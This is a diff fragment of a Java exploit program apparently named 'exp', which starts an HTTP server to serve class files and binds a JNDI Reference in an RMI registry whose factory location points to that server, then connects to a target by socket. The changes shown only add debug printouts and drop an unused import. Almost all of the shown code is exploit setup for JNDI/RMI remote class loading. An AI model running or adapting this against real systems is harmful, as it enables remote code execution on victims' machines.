@@ -7,7 +7,6 @@ import com.sun.net.httpserver.HttpServer;
 
 import javax.naming.Reference;
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.ObjectOutputStream;
 import java.net.InetSocketAddress;
@@ -20,6 +19,7 @@ class HttpFileHandler implements HttpHandler {
         try {
             System.out.println("Request: "+httpExchange.getRemoteAddress()+" "+httpExchange.getRequestURI());
             InputStream inputStream = HttpFileHandler.class.getResourceAsStream(httpExchange.getRequestURI().getPath());
+            System.out.println(httpExchange.getRequestURI().getPath());
             ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
             while(inputStream.available()>0) {
                 byteArrayOutputStream.write(inputStream.read());
@@ -60,10 +60,12 @@ public class exp {
         System.out.println("Creating RMI Registry");
         Registry registry = LocateRegistry.createRegistry(RMIPort);
         String factoryLocation = "http://" + localAddress + ":" + localPort + "/";
+        System.out.println("Factory location: " + factoryLocation);
         Reference reference = new javax.naming.Reference("ExportObject","ExportObject", factoryLocation);
         ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
         registry.bind("Object", referenceWrapper);
         String JNDIAddress = "rmi://127.0.0.1:" + RMIPort + "/Object";
+        System.out.println("JNDI Address: " + JNDIAddress);
 
         // Connect to target via socket.
         System.out.println("Connecting to target " + ServerAddress + ":" + ServerPort);
